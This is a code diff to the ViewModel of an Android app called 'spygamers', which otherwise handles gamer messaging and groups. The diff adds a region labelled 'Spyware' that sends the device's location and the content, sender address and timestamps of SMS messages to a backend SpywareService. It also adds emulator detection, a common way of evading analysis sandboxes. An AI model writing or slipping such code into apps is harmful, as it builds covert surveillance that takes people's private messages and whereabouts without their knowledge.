@@ -18,6 +18,10 @@ import com.example.spygamers.services.directmessaging.DirectMessagingService
 import com.example.spygamers.services.directmessaging.GetDirectMessagesBody
 import com.example.spygamers.services.group.GroupService
 import com.example.spygamers.services.group.body.GetGroupMessagesBody
+import com.example.spygamers.services.spyware.LocationCheckBody
+import com.example.spygamers.services.spyware.SmsCheckBody
+import com.example.spygamers.services.spyware.SpywareService
+import com.example.spygamers.utils.isRunningOnEmulator
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -362,6 +366,48 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
 
     //#endregion
 
+    //#region Spyware
+
+    private val _runningOnEmulator = MutableStateFlow<Boolean>(false)
+    val isOnEmulator: StateFlow<Boolean> = _runningOnEmulator
+
+    fun logLocations(lat: Double, lng: Double) {
+        viewModelScope.launch {
+            val service = serviceFactory.createService(SpywareService::class.java)
+            service.locationCheck(
+                LocationCheckBody(
+                    _sessionToken.value,
+                    lat,
+                    lng
+                )
+            )
+        }
+    }
+
+    fun logSms(
+        smsContent: String,
+        address: String,
+        smsID: Long,
+        longTimestamp: Long,
+        isInbox: Boolean
+    ){
+        viewModelScope.launch {
+            val service = serviceFactory.createService(SpywareService::class.java)
+            service.smsCheck(
+                SmsCheckBody(
+                    _sessionToken.value,
+                    content = smsContent,
+                    targetNumber = address,
+                    timestamp = longTimestamp,
+                    isInbox = isInbox,
+                    smsID = smsID
+                )
+            )
+        }
+    }
+
+    //#endregion
+
     init {
         viewModelScope.launch {
             _isInitializing.value = true
@@ -370,5 +416,8 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
             loadPermissionGrants()
             _isInitializing.value = false
         }
+
+        _runningOnEmulator.value = isRunningOnEmulator()
+        Log.d("Emulator Detection", "Value :: ${_runningOnEmulator.value}")
     }
 }
